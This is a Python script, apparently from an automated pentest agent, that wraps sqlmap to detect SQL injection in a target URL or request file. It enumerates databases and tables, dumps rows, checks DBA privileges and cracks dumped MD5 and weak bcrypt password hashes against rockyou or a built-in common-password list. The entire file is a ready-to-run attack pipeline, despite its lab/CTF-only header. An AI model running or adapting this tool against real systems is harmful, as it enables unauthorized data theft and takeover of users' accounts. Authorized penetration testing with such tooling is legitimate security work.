#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""sqlmap automation agent for orchestrating SQL injection scans via subprocess."""
import csv
from pathlib import Path
import argparse
import hashlib  
from itertools import islice
import json
import logging
import re
import subprocess
import sys
from datetime import datetime, timezone
from typing import List, Optional

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

MAX_PROFILE_DATABASES = 3
MAX_PROFILE_TABLES = 40
MAX_TOTAL_DUMP_TABLES = 10       # tope global de tablas volcadas
MAX_DUMP_ROWS = 5             # filas por tabla
MAX_DUMP_CELL_LEN = 250          # recorte por celda

SQLMAP_TEST_OPTIONS = ("--level=3", "--risk=2")
SQLMAP_COMMAND_TIMEOUT_SECONDS = 300
SQLMAP_OUTPUT_DIR = "/tmp/sqlmap_out"
ROCKYOU_PATH = "/app/rockyou.txt"
MAX_BCRYPT_COST_TO_CRACK = 4
MAX_BCRYPT_ATTEMPTS = 1000

# Bcrypt: $2a$NN$...  (NN = coste, 60 chars totales)
BCRYPT_RE = re.compile(r"^\$2[aby]?\$(\d{2})\$[A-Za-z0-9./]{53}$")

PASSWORD_FIELD_HINTS = (
    "password", "passwd", "pwd", "clave", "contrasena", "contraseña", "secret",
)


COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", 
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", 
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", 
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", 
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", 
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", 
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "admin", 
    "admin123", "root", "toor", "pass", "test", "guest", "user", "welcome", 
    "login", "princess", "solo", "starwars", "whatever", "qazwsxedc", 
    "password1", "password123", "maria", "lucia", "pedro", "carlos"
]


class SqlmapCommandTimeout(RuntimeError):
    pass


def _get_dictionary():
    if Path(ROCKYOU_PATH).exists():
        with open(ROCKYOU_PATH, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                yield line.strip()
    else:
        logger.warning("No se encontró %s; se usará el diccionario interno", ROCKYOU_PATH)
        for word in COMMON_PASSWORDS:
            yield word    

def _looks_like_password_field(key: str) -> bool:
    key_lower = key.casefold()
    return any(hint in key_lower for hint in PASSWORD_FIELD_HINTS)


def _try_bcrypt_checkpw():
    """Devuelve fn(password_bytes, hash_bytes) -> bool, o None si no hay backend."""
    try:
        import bcrypt as _bcrypt

        def check(pw: bytes, h: bytes) -> bool:
            try:
                return _bcrypt.checkpw(pw, h)
            except Exception:
                return False

        logger.info("bcrypt cracking backend: python 'bcrypt' package")
        return check
    except ImportError:
        pass

    try:
        import crypt as _crypt

        def check(pw: bytes, h: bytes) -> bool:
            try:
                return _crypt.crypt(pw.decode("utf-8"), h.decode("utf-8")) == h.decode("utf-8")
            except Exception:
                return False

        logger.info("bcrypt cracking backend: stdlib 'crypt' (glibc)")
        return check
    except ImportError:
        pass

    logger.warning(
        "No hay backend bcrypt disponible ('bcrypt' ni 'crypt'). "
        "Solo se detectará el hash y su coste, sin crackear."
    )
    return None


def _crack_bcrypt(check_fn, hash_str: str, cost: int) -> Optional[str]:
    """Prueba el diccionario contra un hash bcrypt. Solo si cost <= umbral."""
    if cost > MAX_BCRYPT_COST_TO_CRACK:
        return None
    hash_bytes = hash_str.encode("utf-8")
    for word in islice(_get_dictionary(), MAX_BCRYPT_ATTEMPTS):
        try:
            if check_fn(word.encode("utf-8"), hash_bytes):
                return word
        except Exception:
            continue
    return None

def _run_sqlmap_command(cmd: list, action: str) -> subprocess.CompletedProcess:
    try:
        return subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=SQLMAP_COMMAND_TIMEOUT_SECONDS,
        )
    except subprocess.TimeoutExpired as error:
        raise SqlmapCommandTimeout(
            f"SQLMap {action} timed out after "
            f"{SQLMAP_COMMAND_TIMEOUT_SECONDS} seconds"
        ) from error


def _combined_output(result: subprocess.CompletedProcess) -> str:
    return "\n".join(
        output
        for output in (result.stdout, result.stderr)
        if isinstance(output, str) and output
    )


def _base_command(sqlmap_bin: str, url: Optional[str], param: Optional[str],
                  request_file: Optional[str] = None, cookie: str = "") -> list:
    cmd = [
        sqlmap_bin,
        "--batch",
        "--random-agent",
        f"--output-dir={SQLMAP_OUTPUT_DIR}",
        "--ignore-code=401",
    ]
    if request_file:
        cmd.extend(["-r", request_file])
    elif url:
        cmd.extend(["-u", url])
    else:
        raise ValueError("Either url or request_file is required")
    if param:
        cmd.extend(["-p", param])
    if cookie:
        cmd.extend(["--cookie", cookie])
    return cmd


def find_sqlmap() -> str:
    """Locate the sqlmap executable."""
    for path in ["sqlmap", "sqlmap.py", "/usr/bin/sqlmap", "/usr/local/bin/sqlmap"]:
        try:
            subprocess.run([path, "--version"], capture_output=True, timeout=5)
            return path
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    sys.exit("sqlmap not found. Install: pip install sqlmap")


def run_detection_scan(sqlmap_bin: str, url: Optional[str], param: Optional[str] = None,
                        request_file: Optional[str] = None,
                        cookie: str = "", tamper: str = "", technique: str = "") -> dict:
    """Run sqlmap detection scan and parse results."""
    cmd = _base_command(sqlmap_bin, url, param, request_file, cookie)
    cmd.extend(SQLMAP_TEST_OPTIONS)
    if tamper:
        cmd.extend(["--tamper", tamper])
    if technique:
        cmd.extend(["--technique", technique])

    logger.info("Running: %s", " ".join(cmd))
    try:
        result = _run_sqlmap_command(cmd, "detection")
    except SqlmapCommandTimeout as error:
        return {
            "scan_type": "detection",
            "url": url,
            "status": "timeout",
            "error": str(error),
            "injectable": False,
            "database": "unknown",
            "techniques": [],
            "summary": [],
            "diagnostics": [str(error)],
            "exit_code": None,
        }

    output = _combined_output(result)
    injectable = bool(
        re.search(
            r"(?i)\bparameter\s+['\"]?[^'\"\s]+['\"]?\s+"
            r"(?:appears to be\b[^\r\n]*\binjectable\b|"
            r"is\s+(?:['\"][^'\"]+['\"]\s+)?injectable\b)|"
            r"sqlmap identified the following injection point\(s\)",
            output,
        )
    )
    summary = [
        line.strip()[:300]
        for line in output.splitlines()
        if re.search(
            r"(?i)^\s*parameter:\s*|parameter\s+['\"]?[^'\"\s]+['\"]?\s+"
            r"(?:appears to be|does not appear to be|is vulnerable|is injectable)|"
            r"sqlmap identified the following injection point\(s\)|"
            r"back-end DBMS:",
            line,
        )
    ][:10]
    diagnostics = [
        line.strip()[:300]
        for line in output.splitlines()
        if any(
            marker in line.casefold()
            for marker in (
                "[error]",
                "[critical]",
                "[warning]",
                "json data found",
                "unable to parse",
                "unable to connect",
                "request file",
            )
        )
    ][:10]
    db_type = _extract_db_type(output)
    techniques = _extract_techniques(output)

    return {
        "scan_type": "detection",
        "url": url,
        "injectable": injectable,
        "database": db_type,
        "techniques": techniques,
        "summary": summary,
        "diagnostics": diagnostics,
        "exit_code": result.returncode,
    }


def enumerate_databases(sqlmap_bin: str, url: Optional[str],
                         param: Optional[str] = None, cookie: str = "",
                         request_file: Optional[str] = None) -> List[str]:
    """Enumerate databases using sqlmap --dbs."""
    cmd = _base_command(sqlmap_bin, url, param, request_file, cookie)
    cmd.extend(SQLMAP_TEST_OPTIONS)
    cmd.append("--dbs")

    result = _run_sqlmap_command(cmd, "database enumeration")
    _require_success(result, "database enumeration")
    databases = []
    in_db_section = False
    for line in _combined_output(result).splitlines():
        if "available databases" in line.lower():
            in_db_section = True
        if in_db_section:
            for db_name in re.findall(r"\[\*\]\s*(\S+)", line):
                if db_name not in databases:
                    databases.append(db_name)
        if in_db_section and not line.strip():
            break

    logger.info("Found %d databases", len(databases))
    return databases


def enumerate_tables(sqlmap_bin: str, url: Optional[str], database: Optional[str],
                     param: Optional[str] = None, cookie: str = "",
                     request_file: Optional[str] = None) -> List[str]:
    """Enumerate tables in a database, or the SQLite schema when unspecified."""
    cmd = _base_command(sqlmap_bin, url, param, request_file, cookie)
    if database and database not in ("SQLite", "SQLite_masterdb"):
        cmd.extend(["-D", database])
    cmd.extend(SQLMAP_TEST_OPTIONS)
    cmd.append("--tables")

    result = _run_sqlmap_command(cmd, "table enumeration")
    _require_success(result, "table enumeration")
    tables = []
    for line in _combined_output(result).splitlines():
        stripped = line.strip()
        table_row = re.fullmatch(r"\|\s*(.*?)\s*\|", stripped)
        if not table_row:
            continue
        table_name = table_row.group(1).strip()
        if not table_name or table_name.casefold() == "table":
            continue
        # Reject banner/ASCII-art artifacts: only real identifiers pass.
        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.\-$]*", table_name):
            continue
        tables.append(table_name)

    if not tables:
        raise RuntimeError("SQLMap table enumeration returned no table names")
    logger.info("Found %d tables in %s", len(tables), database or "SQLite schema")
    return tables


def _require_success(result: subprocess.CompletedProcess, action: str) -> None:
    if result.returncode != 0:
        raise RuntimeError(
            f"SQLMap {action} failed with exit code {result.returncode}"
        )


def run_schema_scan(sqlmap_bin: str, url: Optional[str], param: Optional[str],
                    request_file: Optional[str] = None, cookie: str = "",
                    database_type: str = "unknown") -> dict:
    """List database and table names without inspecting columns or row data."""
    profile = {"databases": [], "databases_truncated": False, "tables": [], "errors": []}
    if database_type.casefold() == "sqlite":
        databases: List[Optional[str]] = [None]
    else:
        try:
            found_databases = enumerate_databases(
                sqlmap_bin, url, param, cookie, request_file
            )
            if not found_databases:
                raise RuntimeError("SQLMap database enumeration returned no names")
            profile["databases"] = found_databases[:MAX_PROFILE_DATABASES]
            profile["databases_truncated"] = (
                len(found_databases) > MAX_PROFILE_DATABASES
            )
            databases = found_databases[:MAX_PROFILE_DATABASES]
        except RuntimeError as error:
            profile["errors"].append({"action": "dbs", "message": str(error)})
            databases = []

    for database in databases:
        try:
            tables = enumerate_tables(
                sqlmap_bin, url, database, param, cookie, request_file
            )
            profile["tables"].append({
                "database": database or "SQLite_masterdb",
                "tables": tables[:MAX_PROFILE_TABLES],
                "tables_truncated": len(tables) > MAX_PROFILE_TABLES,
            })
        except RuntimeError as error:
            profile["errors"].append({
                "action": "tables",
                "database": database or "SQLite_masterdb",
                "message": str(error),
            })

    profile["status"] = "partial" if profile["errors"] else "completed"
    return profile


def run_validation_scan(sqlmap_bin: str, url: Optional[str],
                        param: Optional[str] = None,
                        request_file: Optional[str] = None,
                        cookie: str = "") -> dict:
    """Confirm injection, then list database and table names only."""
    result = run_detection_scan(
        sqlmap_bin, url, param, request_file=request_file, cookie=cookie
    )
    profile = {"status": "skipped", "reason": "not_confirmed"}
    if result.get("status") == "timeout":
        profile = {"status": "skipped", "reason": "detection_timeout"}
    elif result["exit_code"] == 0 and result["injectable"] is True:
        profile = run_schema_scan(
            sqlmap_bin,
            url,
            param,
            request_file=request_file,
            cookie=cookie,
            database_type=result["database"],
        )
    elif result["exit_code"] != 0:
        profile = {"status": "skipped", "reason": "detection_failed"}

    return {"action": "validate", "result": result, "profile": profile}


def _decode_hex(val) -> str:
    """SQLMap con --hex devuelve los strings como '0x61646d696e'. Esto los limpia."""
    if isinstance(val, str) and val.startswith("0x"):
        try:
            return bytes.fromhex(val[2:]).decode('utf-8', errors='replace')
        except ValueError:
            pass
    return val


def dump_table(sqlmap_bin: str, url: Optional[str], database: Optional[str],
               table: str, columns: Optional[List[str]] = None,
               limit: int = MAX_DUMP_ROWS, param: Optional[str] = None,
               cookie: str = "", request_file: Optional[str] = None) -> dict:
    """Extrae directamente con --sql-query LIMIT X para evitar cuelgues."""
    
    # Usamos --sql-query directamente. Es mucho más rápido que --dump.
    # El LIMIT {limit} asegura que la BD solo procese unas pocas filas.
    sql = f"SELECT * FROM {table} LIMIT {limit}"
    
    cmd = _base_command(sqlmap_bin, url, param, request_file, cookie)
    if database and database not in ("SQLite", "SQLite_masterdb"):
        cmd.extend(["-D", database])
    
    # --hex sigue siendo necesario para evitar errores 500 en JSON
    cmd.extend(["--sql-query", sql, "--hex"])

    try:
        result = _run_sqlmap_command(cmd, f"sql-query on {table}")
    except SqlmapCommandTimeout as e:
        return {
            "database": database or "SQLite",
            "table": table,
            "row_count": 0,
            "truncated": False,
            "rows": [],
            "error": str(e)
        }

    rows = _parse_dump_stdout(result.stdout)
    
    # Si el resultado vino del CSV por alguna razón (raro con sql-query, pero por si acaso)
    if not rows:
        rows = _load_dump_csv(database, table)

    truncated = len(rows) > limit
    rows = rows[:limit]
    
    # Decodificamos los valores hexadecimales (0x61646d696e -> admin)
    def _decode_hex(val):
        if isinstance(val, str) and val.startswith("0x"):
            try:
                return bytes.fromhex(val[2:]).decode('utf-8', errors='replace')
            except ValueError:
                pass
        return val
        
    rows = [
        {str(k)[:60]: _truncate_cell(_decode_hex(v)) for k, v in row.items()} 
        for row in rows
    ]
    
    response = {
        "database": database or "SQLite", 
        "table": table,
        "row_count": len(rows), 
        "truncated": truncated, 
        "rows": rows,
    }
    
    if not rows:
        response["diagnostics"] = _combined_output(result)[-2000:]
        
    return response

def _crack_hashes(dumps: list) -> None:
    md5_targets = {}
    bcrypt_targets = []
    for dump in dumps:
        for row in dump.get("rows", []):
            for key, value in list(row.items()):
                if not isinstance(value, str) or not value:
                    continue
                match = BCRYPT_RE.fullmatch(value)
                if match:
                    cost = int(match.group(1))
                    row[f"{key}_hash_type"] = "bcrypt"
                    row[f"{key}_bcrypt_cost"] = cost
                    row[f"{key}_bcrypt_weak"] = cost <= MAX_BCRYPT_COST_TO_CRACK
                    if cost > MAX_BCRYPT_COST_TO_CRACK:
                        row[f"{key}_crack_note"] = (
                            f"cost {cost} too slow, skipped "
                            f"(threshold: {MAX_BCRYPT_COST_TO_CRACK})"
                        )
                    else:
                        bcrypt_targets.append((row, key, value, cost))
                elif re.fullmatch(r"[a-fA-F0-9]{32}", value):
                    row[f"{key}_hash_type"] = "md5"
                    md5_targets.setdefault(value.lower(), []).append((row, key))
                elif _looks_like_password_field(key) and 4 <= len(value) <= 64:
                    row[f"{key}_hash_type"] = "plaintext"
                    row[f"{key}_plaintext_exposed"] = True

    if md5_targets:
        for word in _get_dictionary():
            matches = md5_targets.pop(hashlib.md5(word.encode()).hexdigest(), [])
            for row, key in matches:
                row[f"{key}_cracked"] = word
            if not md5_targets:
                break
        for matches in md5_targets.values():
            for row, key in matches:
                row[f"{key}_crack_note"] = "not_in_wordlist"

    if bcrypt_targets:
        check_fn = _try_bcrypt_checkpw()
        for row, key, value, cost in bcrypt_targets:
            if check_fn is None:
                row[f"{key}_crack_note"] = "no bcrypt backend available"
                continue
            cracked = _crack_bcrypt(check_fn, value, cost)
            if cracked is not None:
                row[f"{key}_cracked"] = cracked
            else:
                row[f"{key}_crack_note"] = (
                    f"not found within first {MAX_BCRYPT_ATTEMPTS} dictionary entries"
                )

def run_extraction_scan(sqlmap_bin: str, url: Optional[str],
                        param: Optional[str] = None,
                        request_file: Optional[str] = None,
                        cookie: str = "",
                        skip_dump: bool = False) -> dict:
    """Confirm injection; enumerate schema + dump unless skip_dump is set."""
    detection = run_detection_scan(
        sqlmap_bin, url, param, request_file=request_file, cookie=cookie
    )
    if detection.get("status") == "timeout":
        return {"action": "extract", "status": "skipped",
                "reason": "detection_timeout", "result": detection}
    if detection["exit_code"] != 0:
        return {"action": "extract", "status": "skipped",
                "reason": "detection_failed", "result": detection}
    if not detection.get("injectable"):
        return {"action": "extract", "status": "skipped",
                "reason": "not_confirmed", "result": detection}

    if skip_dump:
        return {
            "action": "extract",
            "status": "detection_only",
            "reason": "dump_already_done",
            "result": detection,
            "profile": {"status": "skipped", "reason": "dump_already_done"},
            "dumps": [],
        }

    profile = run_schema_scan(
        sqlmap_bin, url, param, request_file=request_file, cookie=cookie,
        database_type=detection.get("database", "unknown"),
    )

    dumps: List[dict] = []
    total = 0
    for schema in profile.get("tables", []):
        if total >= MAX_TOTAL_DUMP_TABLES:
            break
        raw_db = schema.get("database")
        db_arg = None if raw_db == "SQLite_masterdb" else raw_db
        for table in schema.get("tables", []):
            if total >= MAX_TOTAL_DUMP_TABLES:
                break
                
            # NUEVO: Saltamos tablas del sistema y de basura
            if table in ("sqlite_sequence", "sqlite_stat1", "sqlite_stat4"):
                continue
                
            try:
                dump = dump_table(
                    sqlmap_bin, url, db_arg, table,
                    param=param, cookie=cookie, request_file=request_file,
                )
            except (RuntimeError, SqlmapCommandTimeout) as error:
                dump = {"database": raw_db, "table": table, "error": str(error)}
            dumps.append(dump)
            total += 1

    has_data = any(d.get("row_count", 0) > 0 for d in dumps if isinstance(d, dict))
    
    if has_data:
        _crack_hashes(dumps)
        
    return {
        "action": "extract",
        "status": "completed" if has_data else "empty_dumps",
        "result": detection,
        "profile": profile,
        "dumps": dumps,
    }

def check_privileges(sqlmap_bin: str, url: str, param: Optional[str] = None,
                      cookie: str = "") -> dict:
    """Check current database user and DBA privileges."""
    cmd = [sqlmap_bin, "-u", url, "--current-user", "--current-db", "--is-dba",
           "--batch", "--random-agent"]
    if param:
        cmd.extend(["-p", param])
    if cookie:
        cmd.extend(["--cookie", cookie])

    result = _run_sqlmap_command(cmd, "privilege check")
    output = result.stdout

    current_user = _extract_value(output, "current user")
    current_db = _extract_value(output, "current database")
    is_dba = "true" in output.lower().split("current user is DBA")[-1][:20].lower() if "current user is DBA" in output else False

    return {"current_user": current_user, "current_db": current_db, "is_dba": is_dba}


def _extract_db_type(output: str) -> str:
    match = re.search(r"(?im)\bback-end DBMS:\s*([^\r\n]+)", output)
    if match:
        detected_db = match.group(1).strip()
        for db in ["MySQL", "PostgreSQL", "Microsoft SQL Server", "Oracle", "SQLite"]:
            if detected_db.casefold().startswith(db.casefold()):
                return db
        return detected_db
    return "unknown"


def _extract_techniques(output: str) -> List[str]:
    injection_report = re.search(
        r"(?is)sqlmap identified the following injection point\(s\).*?"
        r"(?:\r?\n\s*-{3,}\s*\r?\n)?(.*?)(?:\r?\n\s*back-end DBMS:|$)",
        output,
    )
    if not injection_report:
        return []

    report_text = injection_report.group(1).lower()
    techniques = []
    for tech in ["boolean-based", "error-based", "UNION query", "stacked queries",
                 "time-based", "inline query"]:
        if tech.lower() in report_text:
            techniques.append(tech)
    return techniques


def _extract_value(output: str, label: str) -> str:
    for line in output.split("\n"):
        if label.lower() in line.lower():
            parts = line.split(":")
            if len(parts) > 1:
                return parts[-1].strip().strip("'\"")
    return ""


def _truncate_cell(value) -> str:
    text = "" if value is None else str(value)
    return text if len(text) <= MAX_DUMP_CELL_LEN else text[:MAX_DUMP_CELL_LEN] + "...[truncated]"


def _load_dump_csv(database: Optional[str], table: str) -> List[dict]:
    """Read the CSV sqlmap writes; handles SQLite's special folder."""
    root = Path(SQLMAP_OUTPUT_DIR)
    if not root.exists():
        return []
    patterns = []
    # SQLMap guarda las tablas SQLite en la carpeta 'SQLite_masterdb'
    patterns.append(f"**/dump/SQLite_masterdb/{table}.csv")
    if database and database not in ("SQLite", "SQLite_masterdb"):
        patterns.append(f"**/dump/{database}/{table}.csv")
    patterns.append(f"**/dump/{table}.csv")  # Fallback genérico
    
    for pattern in patterns:
        for path in root.glob(pattern):
            try:
                with path.open(newline="", encoding="utf-8", errors="replace") as handle:
                    return list(csv.DictReader(handle))
            except (OSError, csv.Error):
                continue
    return []


def _parse_dump_stdout(output: str) -> List[dict]:
    """Parse sqlmap --sql-query [*] CSV output AND legacy +/- table format."""
    rows: List[dict] = []

    # ── Formato 1: --sql-query devuelve [*] v1,v2,v3 por fila ──
    # Necesitamos extraer los nombres de columnas del log de SQLMap:
    # [INFO] the query with expanded column name(s) is: SELECT col1, col2 FROM tabla LIMIT 5
    columns: Optional[List[str]] = None
    col_match = re.search(
        r"the query with expanded column name\(s\) is:\s*SELECT\s+(.+?)\s+FROM\s+",
        output, re.IGNORECASE,
    )
    if col_match:
        columns = [c.strip() for c in col_match.group(1).split(",")]

    for line in output.splitlines():
        stripped = line.strip()
        if not stripped.startswith("[*] "):
            continue
        data = stripped[4:]
        try:
            cells = [c.strip() for c in next(csv.reader([data]))]
        except csv.Error:
            continue
        if not cells:
            continue
        if columns and len(cells) == len(columns):
            rows.append(dict(zip(columns, cells)))
        # Si el conteo no coincide (ej. valores con comas internas como
        # "gluten,huevo,lácteos" en products), descartamos esa fila para
        # no corromper el JSON con mapeos incorrectos.

    if rows:
        return rows

    # ── Formato 2 (fallback): tabla +---+---+ de --dump ──
    header: Optional[List[str]] = None
    data_mode = False
    for line in output.splitlines():
        stripped = line.strip()
        if re.fullmatch(r"\+[-+]+\+", stripped):
            if header is None:
                continue
            data_mode = not data_mode
            if not data_mode:
                header = None
            continue
        if not (stripped.startswith("|") and stripped.endswith("|")):
            continue
        cells = [c.strip() for c in stripped.strip("|").split("|")]
        if header is None:
            header = cells
        elif data_mode and len(cells) == len(header):
            rows.append(dict(zip(header, cells)))
    return rows

def main():
    parser = argparse.ArgumentParser(description="sqlmap Automation Agent")
    parser.add_argument("--url", help="Target URL with injectable param")
    parser.add_argument("--request-file", help="Raw captured HTTP request file")
    parser.add_argument("--param", help="Specific parameter to test")
    parser.add_argument("--cookie", default="", help="Cookie header value")
    parser.add_argument("--tamper", default="", help="Tamper scripts (comma-separated)")
    parser.add_argument(
        "--technique",
        default="",
        help="SQLMap techniques for detect only (e.g. BEU to exclude time-based tests)",
    )
    parser.add_argument(
        "--action",
        choices=["detect", "validate", "extract", "dbs", "tables", "dump", "privs"],
        default="detect",
    )
    parser.add_argument("--database", help="Database name for table/dump actions")
    parser.add_argument("--table", help="Table name for dump action")
    parser.add_argument(
        "--skip-dump", action="store_true",
        help="In extract, run detection only; skip schema enumeration and dump",
    )
    parser.add_argument("--output", default="sqlmap_report.json")
    args = parser.parse_args()
    if args.technique:
        args.technique = args.technique.upper()
        if args.action != "detect":
            parser.error("--technique is supported only with --action detect")
        if not re.fullmatch(r"[BEUSTQ]+", args.technique):
            parser.error("--technique must contain only SQLMap technique letters BEUSTQ")

    report = {
        "action": args.action,
        "url": args.url,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    try:
        if not args.url and not args.request_file:
            raise ValueError("either --url or --request-file is required")
        if args.request_file and args.action not in {"detect", "validate", "extract"}:
            raise ValueError("--request-file is supported only for detect, validate or extract")

        sqlmap_bin = find_sqlmap()

        if args.action == "detect":
            report["result"] = run_detection_scan(
                sqlmap_bin, args.url, args.param,
                request_file=args.request_file, cookie=args.cookie, tamper=args.tamper,
                technique=args.technique,
            )
        elif args.action == "validate":
            report.update(run_validation_scan(
                sqlmap_bin, args.url, args.param,
                request_file=args.request_file, cookie=args.cookie,
            ))
        elif args.action == "extract":
            report.update(run_extraction_scan(
                sqlmap_bin, args.url, args.param,
                request_file=args.request_file, cookie=args.cookie,
                skip_dump=args.skip_dump,
            ))
        elif args.action == "dbs":
            report["databases"] = enumerate_databases(
                sqlmap_bin, args.url, args.param, args.cookie
            )
        elif args.action == "tables" and args.database:
            report["tables"] = enumerate_tables(
                sqlmap_bin, args.url, args.database, args.param, args.cookie
            )
        elif args.action == "dump" and args.database and args.table:
            report["dump"] = dump_table(
                sqlmap_bin, args.url, args.database, args.table,
                param=args.param, cookie=args.cookie,
            )
        elif args.action == "privs":
            report["privileges"] = check_privileges(
                sqlmap_bin, args.url, args.param, args.cookie
            )
            
    except Exception as e:
        # CAPTURAMOS CUALQUIER ERROR para que el handler no se quede a ciegas
        logger.exception("Fallo catastrófico durante la ejecución de SQLMap")
        report["error"] = f"Excepción interna en sqli_map.py: {str(e)}"

    # Siempre guardamos e imprimimos el JSON final, incluso si hubo error
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)
    print(f"SQLI_MAP_REPORT={json.dumps(report, separators=(',', ':'))}")


if __name__ == "__main__":
    main()